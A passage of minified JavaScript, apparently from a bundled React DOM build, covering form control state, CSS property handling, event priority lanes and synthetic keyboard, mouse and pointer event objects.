    r = t.checked != null ? t.checked : t.defaultChecked;
  n = dr(t.value != null ? t.value : n), e._wrapperState = {
    initialChecked: r,
    initialValue: n,
    controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
  }
}

function h0(e, t) {
  t = t.checked, t != null && Md(e, "checked", t, !1)
}

function fu(e, t) {
  h0(e, t);
  var n = dr(t.value),
    r = t.type;
  if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
  else if (r === "submit" || r === "reset") {
    e.removeAttribute("value");
    return
  }
  t.hasOwnProperty("value") ? hu(e, t.type, n) : t.hasOwnProperty("defaultValue") && hu(e, t.type, dr(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}

function Dh(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
    var r = t.type;
    if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
    t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
  }
  n = e.name, n !== "" && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, n !== "" && (e.name = n)
}

function hu(e, t, n) {
  (t !== "number" || ka(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var Co = Array.isArray;

function vs(e, t, n, r) {
  if (e = e.options, t) {
    t = {};
    for (var s = 0; s < n.length; s++) t["$" + n[s]] = !0;
    for (n = 0; n < e.length; n++) s = t.hasOwnProperty("$" + e[n].value), e[n].selected !== s && (e[n].selected = s), s && r && (e[n].defaultSelected = !0)
  } else {
    for (n = "" + dr(n), t = null, s = 0; s < e.length; s++) {
      if (e[s].value === n) {
        e[s].selected = !0, r && (e[s].defaultSelected = !0);
        return
      }
      t !== null || e[s].disabled || (t = e[s])
    }
    t !== null && (t.selected = !0)
  }
}

function mu(e, t) {
  if (t.dangerouslySetInnerHTML != null) throw Error(O(91));
  return be({}, t, {
    value: void 0,
    defaultValue: void 0,
    children: "" + e._wrapperState.initialValue
  })
}

function Mh(e, t) {
  var n = t.value;
  if (n == null) {
    if (n = t.children, t = t.defaultValue, n != null) {
      if (t != null) throw Error(O(92));
      if (Co(n)) {
        if (1 < n.length) throw Error(O(93));
        n = n[0]
      }
      t = n
    }
    t == null && (t = ""), n = t
  }
  e._wrapperState = {
    initialValue: dr(n)
  }
}

function m0(e, t) {
  var n = dr(t.value),
    r = dr(t.defaultValue);
  n != null && (n = "" + n, n !== e.value && (e.value = n), t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)), r != null && (e.defaultValue = "" + r)
}

function _h(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}

function p0(e) {
  switch (e) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml"
  }
}

function pu(e, t) {
  return e == null || e === "http://www.w3.org/1999/xhtml" ? p0(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var Ui, g0 = function (e) {
  return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function (t, n, r, s) {
    MSApp.execUnsafeLocalFunction(function () {
      return e(t, n, r, s)
    })
  } : e
}(function (e, t) {
  if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
  else {
    for (Ui = Ui || document.createElement("div"), Ui.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = Ui.firstChild; e.firstChild;) e.removeChild(e.firstChild);
    for (; t.firstChild;) e.appendChild(t.firstChild)
  }
});

function Ho(e, t) {
  if (t) {
    var n = e.firstChild;
    if (n && n === e.lastChild && n.nodeType === 3) {
      n.nodeValue = t;
      return
    }
  }
  e.textContent = t
}
var Eo = {
  animationIterationCount: !0,
  aspectRatio: !0,
  borderImageOutset: !0,
  borderImageSlice: !0,
  borderImageWidth: !0,
  boxFlex: !0,
  boxFlexGroup: !0,
  boxOrdinalGroup: !0,
  columnCount: !0,
  columns: !0,
  flex: !0,
  flexGrow: !0,
  flexPositive: !0,
  flexShrink: !0,
  flexNegative: !0,
  flexOrder: !0,
  gridArea: !0,
  gridRow: !0,
  gridRowEnd: !0,
  gridRowSpan: !0,
  gridRowStart: !0,
  gridColumn: !0,
  gridColumnEnd: !0,
  gridColumnSpan: !0,
  gridColumnStart: !0,
  fontWeight: !0,
  lineClamp: !0,
  lineHeight: !0,
  opacity: !0,
  order: !0,
  orphans: !0,
  tabSize: !0,
  widows: !0,
  zIndex: !0,
  zoom: !0,
  fillOpacity: !0,
  floodOpacity: !0,
  stopOpacity: !0,
  strokeDasharray: !0,
  strokeDashoffset: !0,
  strokeMiterlimit: !0,
  strokeOpacity: !0,
  strokeWidth: !0
},
  e2 = ["Webkit", "ms", "Moz", "O"];
Object.keys(Eo).forEach(function (e) {
  e2.forEach(function (t) {
    t = t + e.charAt(0).toUpperCase() + e.substring(1), Eo[t] = Eo[e]
  })
});

function y0(e, t, n) {
  return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || Eo.hasOwnProperty(e) && Eo[e] ? ("" + t).trim() : t + "px"
}

function v0(e, t) {
  e = e.style;
  for (var n in t)
    if (t.hasOwnProperty(n)) {
      var r = n.indexOf("--") === 0,
        s = y0(n, t[n], r);
      n === "float" && (n = "cssFloat"), r ? e.setProperty(n, s) : e[n] = s
    }
}
var t2 = be({
  menuitem: !0
}, {
  area: !0,
  base: !0,
  br: !0,
  col: !0,
  embed: !0,
  hr: !0,
  img: !0,
  input: !0,
  keygen: !0,
  link: !0,
  meta: !0,
  param: !0,
  source: !0,
  track: !0,
  wbr: !0
});

function gu(e, t) {
  if (t) {
    if (t2[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(O(137, e));
    if (t.dangerouslySetInnerHTML != null) {
      if (t.children != null) throw Error(O(60));
      if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML)) throw Error(O(61))
    }
    if (t.style != null && typeof t.style != "object") throw Error(O(62))
  }
}

function yu(e, t) {
  if (e.indexOf("-") === -1) return typeof t.is == "string";
  switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0
  }
}
var vu = null;

function Od(e) {
  return e = e.target || e.srcElement || window, e.correspondingUseElement && (e = e.correspondingUseElement), e.nodeType === 3 ? e.parentNode : e
}
var xu = null,
  xs = null,
  ws = null;

function Ih(e) {
  if (e = bi(e)) {
    if (typeof xu != "function") throw Error(O(280));
    var t = e.stateNode;
    t && (t = bl(t), xu(e.stateNode, e.type, t))
  }
}

function x0(e) {
  xs ? ws ? ws.push(e) : ws = [e] : xs = e
}

function w0() {
  if (xs) {
    var e = xs,
      t = ws;
    if (ws = xs = null, Ih(e), t)
      for (e = 0; e < t.length; e++) Ih(t[e])
  }
}

function b0(e, t) {
  return e(t)
}

function S0() { }
var lc = !1;

function C0(e, t, n) {
  if (lc) return e(t, n);
  lc = !0;
  try {
    return b0(e, t, n)
  } finally {
    lc = !1, (xs !== null || ws !== null) && (S0(), w0())
  }
}

function Wo(e, t) {
  var n = e.stateNode;
  if (n === null) return null;
  var r = bl(n);
  if (r === null) return null;
  n = r[t];
  e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) || (e = e.type, r = !(e === "button" || e === "input" || e === "select" || e === "textarea")), e = !r;
      break e;
    default:
      e = !1
  }
  if (e) return null;
  if (n && typeof n != "function") throw Error(O(231, t, typeof n));
  return n
}
var wu = !1;
if (En) try {
  var lo = {};
  Object.defineProperty(lo, "passive", {
    get: function () {
      wu = !0
    }
  }), window.addEventListener("test", lo, lo), window.removeEventListener("test", lo, lo)
} catch {
  wu = !1
}

function n2(e, t, n, r, s, o, i, a, c) {
  var u = Array.prototype.slice.call(arguments, 3);
  try {
    t.apply(n, u)
  } catch (d) {
    this.onError(d)
  }
}
var To = !1,
  Ra = null,
  Da = !1,
  bu = null,
  r2 = {
    onError: function (e) {
      To = !0, Ra = e
    }
  };

function s2(e, t, n, r, s, o, i, a, c) {
  To = !1, Ra = null, n2.apply(r2, arguments)
}

function o2(e, t, n, r, s, o, i, a, c) {
  if (s2.apply(this, arguments), To) {
    if (To) {
      var u = Ra;
      To = !1, Ra = null
    } else throw Error(O(198));
    Da || (Da = !0, bu = u)
  }
}

function Kr(e) {
  var t = e,
    n = e;
  if (e.alternate)
    for (; t.return;) t = t.return;
  else {
    e = t;
    do t = e, t.flags & 4098 && (n = t.return), e = t.return; while (e)
  }
  return t.tag === 3 ? n : null
}

function N0(e) {
  if (e.tag === 13) {
    var t = e.memoizedState;
    if (t === null && (e = e.alternate, e !== null && (t = e.memoizedState)), t !== null) return t.dehydrated
  }
  return null
}

function Lh(e) {
  if (Kr(e) !== e) throw Error(O(188))
}

function i2(e) {
  var t = e.alternate;
  if (!t) {
    if (t = Kr(e), t === null) throw Error(O(188));
    return t !== e ? null : e
  }
  for (var n = e, r = t; ;) {
    var s = n.return;
    if (s === null) break;
    var o = s.alternate;
    if (o === null) {
      if (r = s.return, r !== null) {
        n = r;
        continue
      }
      break
    }
    if (s.child === o.child) {
      for (o = s.child; o;) {
        if (o === n) return Lh(s), e;
        if (o === r) return Lh(s), t;
        o = o.sibling
      }
      throw Error(O(188))
    }
    if (n.return !== r.return) n = s, r = o;
    else {
      for (var i = !1, a = s.child; a;) {
        if (a === n) {
          i = !0, n = s, r = o;
          break
        }
        if (a === r) {
          i = !0, r = s, n = o;
          break
        }
        a = a.sibling
      }
      if (!i) {
        for (a = o.child; a;) {
          if (a === n) {
            i = !0, n = o, r = s;
            break
          }
          if (a === r) {
            i = !0, r = o, n = s;
            break
          }
          a = a.sibling
        }
        if (!i) throw Error(O(189))
      }
    }
    if (n.alternate !== r) throw Error(O(190))
  }
  if (n.tag !== 3) throw Error(O(188));
  return n.stateNode.current === n ? e : t
}

function j0(e) {
  return e = i2(e), e !== null ? A0(e) : null
}

function A0(e) {
  if (e.tag === 5 || e.tag === 6) return e;
  for (e = e.child; e !== null;) {
    var t = A0(e);
    if (t !== null) return t;
    e = e.sibling
  }
  return null
}
var P0 = wt.unstable_scheduleCallback,
  Oh = wt.unstable_cancelCallback,
  a2 = wt.unstable_shouldYield,
  l2 = wt.unstable_requestPaint,
  Pe = wt.unstable_now,
  c2 = wt.unstable_getCurrentPriorityLevel,
  Fd = wt.unstable_ImmediatePriority,
  E0 = wt.unstable_UserBlockingPriority,
  Ma = wt.unstable_NormalPriority,
  u2 = wt.unstable_LowPriority,
  T0 = wt.unstable_IdlePriority,
  yl = null,
  sn = null;

function d2(e) {
  if (sn && typeof sn.onCommitFiberRoot == "function") try {
    sn.onCommitFiberRoot(yl, e, void 0, (e.current.flags & 128) === 128)
  } catch { }
}
var Qt = Math.clz32 ? Math.clz32 : m2,
  f2 = Math.log,
  h2 = Math.LN2;

function m2(e) {
  return e >>>= 0, e === 0 ? 32 : 31 - (f2(e) / h2 | 0) | 0
}
var $i = 64,
  Hi = 4194304;

function No(e) {
  switch (e & -e) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return e & 130023424;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return e
  }
}

function _a(e, t) {
  var n = e.pendingLanes;
  if (n === 0) return 0;
  var r = 0,
    s = e.suspendedLanes,
    o = e.pingedLanes,
    i = n & 268435455;
  if (i !== 0) {
    var a = i & ~s;
    a !== 0 ? r = No(a) : (o &= i, o !== 0 && (r = No(o)))
  } else i = n & ~s, i !== 0 ? r = No(i) : o !== 0 && (r = No(o));
  if (r === 0) return 0;
  if (t !== 0 && t !== r && !(t & s) && (s = r & -r, o = t & -t, s >= o || s === 16 && (o & 4194240) !== 0)) return t;
  if (r & 4 && (r |= n & 16), t = e.entangledLanes, t !== 0)
    for (e = e.entanglements, t &= r; 0 < t;) n = 31 - Qt(t), s = 1 << n, r |= e[n], t &= ~s;
  return r
}

function p2(e, t) {
  switch (e) {
    case 1:
    case 2:
    case 4:
      return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
      return -1;
    default:
      return -1
  }
}

function g2(e, t) {
  for (var n = e.suspendedLanes, r = e.pingedLanes, s = e.expirationTimes, o = e.pendingLanes; 0 < o;) {
    var i = 31 - Qt(o),
      a = 1 << i,
      c = s[i];
    c === -1 ? (!(a & n) || a & r) && (s[i] = p2(a, t)) : c <= t && (e.expiredLanes |= a), o &= ~a
  }
}

function Su(e) {
  return e = e.pendingLanes & -1073741825, e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}

function k0() {
  var e = $i;
  return $i <<= 1, !($i & 4194240) && ($i = 64), e
}

function cc(e) {
  for (var t = [], n = 0; 31 > n; n++) t.push(e);
  return t
}

function xi(e, t, n) {
  e.pendingLanes |= t, t !== 536870912 && (e.suspendedLanes = 0, e.pingedLanes = 0), e = e.eventTimes, t = 31 - Qt(t), e[t] = n
}

function y2(e, t) {
  var n = e.pendingLanes & ~t;
  e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
  var r = e.eventTimes;
  for (e = e.expirationTimes; 0 < n;) {
    var s = 31 - Qt(n),
      o = 1 << s;
    t[s] = 0, r[s] = -1, e[s] = -1, n &= ~o
  }
}

function Vd(e, t) {
  var n = e.entangledLanes |= t;
  for (e = e.entanglements; n;) {
    var r = 31 - Qt(n),
      s = 1 << r;
    s & t | e[r] & t && (e[r] |= t), n &= ~s
  }
}
var le = 0;

function R0(e) {
  return e &= -e, 1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var D0, Bd, M0, _0, I0, Cu = !1,
  Wi = [],
  tr = null,
  nr = null,
  rr = null,
  Ko = new Map,
  Qo = new Map,
  Hn = [],
  v2 = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

function Fh(e, t) {
  switch (e) {
    case "focusin":
    case "focusout":
      tr = null;
      break;
    case "dragenter":
    case "dragleave":
      nr = null;
      break;
    case "mouseover":
    case "mouseout":
      rr = null;
      break;
    case "pointerover":
    case "pointerout":
      Ko.delete(t.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      Qo.delete(t.pointerId)
  }
}

function co(e, t, n, r, s, o) {
  return e === null || e.nativeEvent !== o ? (e = {
    blockedOn: t,
    domEventName: n,
    eventSystemFlags: r,
    nativeEvent: o,
    targetContainers: [s]
  }, t !== null && (t = bi(t), t !== null && Bd(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, s !== null && t.indexOf(s) === -1 && t.push(s), e)
}

function x2(e, t, n, r, s) {
  switch (t) {
    case "focusin":
      return tr = co(tr, e, t, n, r, s), !0;
    case "dragenter":
      return nr = co(nr, e, t, n, r, s), !0;
    case "mouseover":
      return rr = co(rr, e, t, n, r, s), !0;
    case "pointerover":
      var o = s.pointerId;
      return Ko.set(o, co(Ko.get(o) || null, e, t, n, r, s)), !0;
    case "gotpointercapture":
      return o = s.pointerId, Qo.set(o, co(Qo.get(o) || null, e, t, n, r, s)), !0
  }
  return !1
}

function L0(e) {
  var t = Pr(e.target);
  if (t !== null) {
    var n = Kr(t);
    if (n !== null) {
      if (t = n.tag, t === 13) {
        if (t = N0(n), t !== null) {
          e.blockedOn = t, I0(e.priority, function () {
            M0(n)
          });
          return
        }
      } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
        e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
        return
      }
    }
  }
  e.blockedOn = null
}

function ha(e) {
  if (e.blockedOn !== null) return !1;
  for (var t = e.targetContainers; 0 < t.length;) {
    var n = Nu(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
    if (n === null) {
      n = e.nativeEvent;
      var r = new n.constructor(n.type, n);
      vu = r, n.target.dispatchEvent(r), vu = null
    } else return t = bi(n), t !== null && Bd(t), e.blockedOn = n, !1;
    t.shift()
  }
  return !0
}

function Vh(e, t, n) {
  ha(e) && n.delete(t)
}

function w2() {
  Cu = !1, tr !== null && ha(tr) && (tr = null), nr !== null && ha(nr) && (nr = null), rr !== null && ha(rr) && (rr = null), Ko.forEach(Vh), Qo.forEach(Vh)
}

function uo(e, t) {
  e.blockedOn === t && (e.blockedOn = null, Cu || (Cu = !0, wt.unstable_scheduleCallback(wt.unstable_NormalPriority, w2)))
}

function Go(e) {
  function t(s) {
    return uo(s, e)
  }
  if (0 < Wi.length) {
    uo(Wi[0], e);
    for (var n = 1; n < Wi.length; n++) {
      var r = Wi[n];
      r.blockedOn === e && (r.blockedOn = null)
    }
  }
  for (tr !== null && uo(tr, e), nr !== null && uo(nr, e), rr !== null && uo(rr, e), Ko.forEach(t), Qo.forEach(t), n = 0; n < Hn.length; n++) r = Hn[n], r.blockedOn === e && (r.blockedOn = null);
  for (; 0 < Hn.length && (n = Hn[0], n.blockedOn === null);) L0(n), n.blockedOn === null && Hn.shift()
}
var bs = _n.ReactCurrentBatchConfig,
  Ia = !0;

function b2(e, t, n, r) {
  var s = le,
    o = bs.transition;
  bs.transition = null;
  try {
    le = 1, zd(e, t, n, r)
  } finally {
    le = s, bs.transition = o
  }
}

function S2(e, t, n, r) {
  var s = le,
    o = bs.transition;
  bs.transition = null;
  try {
    le = 4, zd(e, t, n, r)
  } finally {
    le = s, bs.transition = o
  }
}

function zd(e, t, n, r) {
  if (Ia) {
    var s = Nu(e, t, n, r);
    if (s === null) xc(e, t, r, La, n), Fh(e, r);
    else if (x2(s, e, t, n, r)) r.stopPropagation();
    else if (Fh(e, r), t & 4 && -1 < v2.indexOf(e)) {
      for (; s !== null;) {
        var o = bi(s);
        if (o !== null && D0(o), o = Nu(e, t, n, r), o === null && xc(e, t, r, La, n), o === s) break;
        s = o
      }
      s !== null && r.stopPropagation()
    } else xc(e, t, r, null, n)
  }
}
var La = null;

function Nu(e, t, n, r) {
  if (La = null, e = Od(r), e = Pr(e), e !== null)
    if (t = Kr(e), t === null) e = null;
    else if (n = t.tag, n === 13) {
      if (e = N0(t), e !== null) return e;
      e = null
    } else if (n === 3) {
      if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
      e = null
    } else t !== e && (e = null);
  return La = e, null
}

function O0(e) {
  switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (c2()) {
        case Fd:
          return 1;
        case E0:
          return 4;
        case Ma:
        case u2:
          return 16;
        case T0:
          return 536870912;
        default:
          return 16
      }
    default:
      return 16
  }
}
var Jn = null,
  Ud = null,
  ma = null;

function F0() {
  if (ma) return ma;
  var e, t = Ud,
    n = t.length,
    r, s = "value" in Jn ? Jn.value : Jn.textContent,
    o = s.length;
  for (e = 0; e < n && t[e] === s[e]; e++);
  var i = n - e;
  for (r = 1; r <= i && t[n - r] === s[o - r]; r++);
  return ma = s.slice(e, 1 < r ? 1 - r : void 0)
}

function pa(e) {
  var t = e.keyCode;
  return "charCode" in e ? (e = e.charCode, e === 0 && t === 13 && (e = 13)) : e = t, e === 10 && (e = 13), 32 <= e || e === 13 ? e : 0
}

function Ki() {
  return !0
}

function Bh() {
  return !1
}

function Ct(e) {
  function t(n, r, s, o, i) {
    this._reactName = n, this._targetInst = s, this.type = r, this.nativeEvent = o, this.target = i, this.currentTarget = null;
    for (var a in e) e.hasOwnProperty(a) && (n = e[a], this[a] = n ? n(o) : o[a]);
    return this.isDefaultPrevented = (o.defaultPrevented != null ? o.defaultPrevented : o.returnValue === !1) ? Ki : Bh, this.isPropagationStopped = Bh, this
  }
  return be(t.prototype, {
    preventDefault: function () {
      this.defaultPrevented = !0;
      var n = this.nativeEvent;
      n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1), this.isDefaultPrevented = Ki)
    },
    stopPropagation: function () {
      var n = this.nativeEvent;
      n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0), this.isPropagationStopped = Ki)
    },
    persist: function () { },
    isPersistent: Ki
  }), t
}
var Ys = {
  eventPhase: 0,
  bubbles: 0,
  cancelable: 0,
  timeStamp: function (e) {
    return e.timeStamp || Date.now()
  },
  defaultPrevented: 0,
  isTrusted: 0
},
  $d = Ct(Ys),
  wi = be({}, Ys, {
    view: 0,
    detail: 0
  }),
  C2 = Ct(wi),
  uc, dc, fo, vl = be({}, wi, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: Hd,
    button: 0,
    buttons: 0,
    relatedTarget: function (e) {
      return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
    },
    movementX: function (e) {
      return "movementX" in e ? e.movementX : (e !== fo && (fo && e.type === "mousemove" ? (uc = e.screenX - fo.screenX, dc = e.screenY - fo.screenY) : dc = uc = 0, fo = e), uc)
    },
    movementY: function (e) {
      return "movementY" in e ? e.movementY : dc
    }
  }),
  zh = Ct(vl),
  N2 = be({}, vl, {
    dataTransfer: 0
  }),
  j2 = Ct(N2),
  A2 = be({}, wi, {
    relatedTarget: 0
  }),
  fc = Ct(A2),
  P2 = be({}, Ys, {
    animationName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  }),
  E2 = Ct(P2),
  T2 = be({}, Ys, {
    clipboardData: function (e) {
      return "clipboardData" in e ? e.clipboardData : window.clipboardData
    }
  }),
  k2 = Ct(T2),
  R2 = be({}, Ys, {
    data: 0
  }),
  Uh = Ct(R2),
  D2 = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified"
  },
  M2 = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta"
  },
  _2 = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey"
  };

function I2(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : (e = _2[e]) ? !!t[e] : !1
}

function Hd() {
  return I2
}
var L2 = be({}, wi, {
  key: function (e) {
    if (e.key) {
      var t = D2[e.key] || e.key;
      if (t !== "Unidentified") return t
    }
    return e.type === "keypress" ? (e = pa(e), e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? M2[e.keyCode] || "Unidentified" : ""
  },
  code: 0,
  location: 0,
  ctrlKey: 0,
  shiftKey: 0,
  altKey: 0,
  metaKey: 0,
  repeat: 0,
  locale: 0,
  getModifierState: Hd,
  charCode: function (e) {
    return e.type === "keypress" ? pa(e) : 0
  },
  keyCode: function (e) {
    return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
  },
  which: function (e) {
    return e.type === "keypress" ? pa(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
  }
}),
  O2 = Ct(L2),
  F2 = be({}, vl, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0
  }),
  $h = Ct(F2),
  V2 = be({}, wi, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: Hd
  }),
  B2 = Ct(V2),
  z2 = be({}, Ys, {
    propertyName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  }),
  U2 = Ct(z2),
  $2 = be({}, vl, {
    deltaX: function (e) {
      return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
    },
    deltaY: function (e) {
      return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
    },
    deltaZ: 0,
    deltaMode: 0
  }),
  H2 = Ct($2),
  W2 = [9, 13, 27, 32],
  Wd = En && "CompositionEvent" in window,
  ko = null;
En && "documentMode" in document && (ko = document.documentMode);
var K2 = En && "TextEvent" in window && !ko,
  V0 = En && (!Wd || ko && 8 < ko && 11 >= ko),
  Hh = " ",
  Wh = !1;

function B0(e, t) {
  switch (e) {
    case "keyup":
      return W2.indexOf(t.keyCode) !== -1;
    case "keydown":
      return t.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1
  }
}

function z0(e) {
  return e = e.detail, typeof e == "object" && "data" in e ? e.data : null
}
var rs = !1;

function Q2(e, t) {
  switch (e) {
    case "compositionend":
      return z0(t);
    case "keypress":
      return t.which !== 32 ? null : (Wh = !0, Hh);
    case "textInput":
      return e = t.data, e === Hh && Wh ? null : e;
    default:
      return null
  }
}

function G2(e, t) {
  if (rs) return e === "compositionend" || !Wd && B0(e, t) ? (e = F0(), ma = Ud = Jn = null, rs = !1, e) : null;
  switch (e) {
    case "paste":
      return null;
    case "keypress":
      if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
        if (t.char && 1 < t.char.length) return t.char;
        if (t.which) return String.fromCharCode(t.which)
      }
      return null;
    case "compositionend":
      return V0 && t.locale !== "ko" ? null : t.data;
    default:
      return null
  }
}
var q2 = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0
};

function Kh(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return t === "input" ? !!q2[e.type] : t === "textarea"
}

function U0(e, t, n, r) {
  x0(r), t = Oa(t, "onChange"), 0 < t.length && (n = new $d("onChange", "change", null, n, r), e.push({
    event: n,
    listeners: t
  }))
}
var Ro = null,
  qo = null;

function Y2(e) {
  Z0(e, 0)
}

function xl(e) {
  var t = is(e);
  if (f0(t)) return e
}

function X2(e, t) {
  if (e === "change") return t
}
var $0 = !1;
if (En) {
  var hc;
  if (En) {
    var mc = "oninput" in document;
    if (!mc) {
      var Qh = document.createElement("div");
      Qh.setAttribute("oninput", "return;"), mc = typeof Qh.oninput == "function"
    }
    hc = mc
  } else hc = !1;
